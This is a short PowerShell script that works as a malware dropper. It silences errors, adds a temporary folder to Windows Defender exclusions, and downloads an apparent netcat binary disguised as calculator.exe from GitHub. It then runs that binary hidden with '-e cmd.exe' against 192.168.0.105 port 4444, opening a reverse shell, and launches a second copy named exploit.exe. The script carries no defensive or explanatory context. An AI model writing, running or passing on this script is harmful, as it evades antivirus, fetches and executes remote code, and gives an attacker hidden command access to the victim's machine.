$ErrorActionPreference = 'SilentlyContinue'

$TempDir = "C:\TempVBS"
$NcPath = "$TempDir\calculator.exe"
$NcPath1 = "$TempDir\exploit.exe"
try {
    New-Item -ItemType Directory -Force -Path $TempDir | Out-Null
} catch {}

try {
    Add-MpPreference -ExclusionPath $TempDir
} catch {}

try {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/KaiKim2/WindowsDefenderBypassNetcat/main/calculator.exe" -OutFile $NcPath
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/KaiKim2/WindowsDefenderBypassNetcat/main/calculator.exe" -OutFile $NcPath1
} catch {}

try {
    $WshShell = New-Object -ComObject WScript.Shell
    $WshShell.Run("`"$NcPath`" 192.168.0.105 4444 -e cmd.exe", 0, $false)
    $WshShell.Run("`"$NcPath1`"./exploit.exe", 0, $false)
} catch {}

Start-Sleep -Seconds 1
